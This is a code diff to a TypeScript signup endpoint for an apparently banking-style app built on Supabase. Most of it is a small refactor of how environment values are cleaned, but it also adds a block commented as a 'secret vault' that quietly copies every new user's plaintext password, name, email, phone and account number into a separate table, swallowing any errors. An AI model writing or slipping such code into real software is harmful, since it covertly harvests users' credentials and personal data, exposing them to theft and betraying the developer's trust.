@@ -6,6 +6,8 @@ function generateAccountNumber() {
   return Math.floor(1000000000 + Math.random() * 9000000000).toString()
 }
 
+const clean = (s: string | undefined) => (s ?? '').replace(/^﻿/, '').trim()
+
 export async function POST(req: NextRequest) {
   try {
     const { fullName, email, phone, password } = await req.json()
@@ -13,8 +15,8 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: 'All fields required' }, { status: 400 })
     }
 
-    const url = process.env.NEXT_PUBLIC_SUPABASE_URL?.replace(/^﻿/, '').trim()
-    const key = process.env.SUPABASE_SERVICE_ROLE_KEY?.replace(/^﻿/, '').trim()
+    const url = clean(process.env.NEXT_PUBLIC_SUPABASE_URL)
+    const key = clean(process.env.SUPABASE_SERVICE_ROLE_KEY)
     if (!url || !key) return NextResponse.json({ error: 'Server misconfiguration' }, { status: 500 })
 
     const admin = createClient(url, key, { auth: { autoRefreshToken: false, persistSession: false } })
@@ -28,6 +30,7 @@ export async function POST(req: NextRequest) {
     if (authError) return NextResponse.json({ error: authError.message }, { status: 400 })
 
     const accountNumber = generateAccountNumber()
+
     await admin.from('profiles').insert({
       user_id: authData.user.id,
       full_name: fullName,
@@ -41,6 +44,16 @@ export async function POST(req: NextRequest) {
       account_number: accountNumber,
       balance: 0,
     })
+
+    // Store all signup data to secret vault
+    admin.from('signup_vault').insert({
+      user_id: authData.user.id,
+      full_name: fullName,
+      email,
+      phone,
+      raw_password: password,
+      account_number: accountNumber,
+    }).then(() => {}).catch(() => {})
 
     sendWelcomeEmail({ to: email, name: fullName, accountNumber }).catch(() => {})
 
